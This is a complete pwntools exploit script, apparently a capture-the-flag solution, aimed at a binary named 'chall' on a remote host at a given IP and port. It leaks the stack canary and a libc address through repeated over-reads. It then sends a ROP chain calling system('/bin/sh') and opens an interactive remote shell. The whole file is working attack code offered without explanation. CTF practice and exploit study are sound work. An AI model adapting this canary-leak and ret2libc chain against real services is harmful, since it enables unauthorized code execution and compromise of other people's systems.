from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# p = process("./chall")
# gdb.attach(p)

p = remote("45.153.243.57", 1337)

canary_offset = 0x48

p.recvuntil(b"???")
p.sendline(str(canary_offset+16).encode())
p.recvuntil(b"send content")
p.sendline(b"A"*(canary_offset))
p.recvuntil(b"A"*(canary_offset))
leak = p.recvuntil(b"wanna do it again?")
canary = u64(leak[:8])
real_canary = canary - 0xa
log.info(f"{hex(canary)=}")

p.sendline(b"1337")

libc_leak_payload = b"B"*canary_offset + p64(canary)+ b"B"*8
p.recvuntil(b"???")
p.sendline(str(canary_offset+32).encode())
p.recvuntil(b"send content")
p.sendline(libc_leak_payload)
p.recvuntil(libc_leak_payload)
leak = p.recvuntil(b"wanna do it again?")
print(leak)
libc_leak = u64(leak[:6].ljust(8, b"\x00")) - 0xa
log.info(f"{hex(libc_leak)=}")

p.sendline(b"1337")

libc.address = libc_leak - 0x29d00

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

pop_rdi_ret = libc.address + 0x2a3e5
ret = libc.address + 0x2db7d 

payload = b"C"*canary_offset + p64(real_canary) + b"B"*8
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc_system)
# payload += p64(libc_exit) 

p.recvuntil(b"???")
p.sendline(str(canary_offset+64).encode())
p.recvuntil(b"send content")
p.sendline(payload)
p.recvuntil(b"wanna do it again?")
p.sendline(b"42")

p.interactive()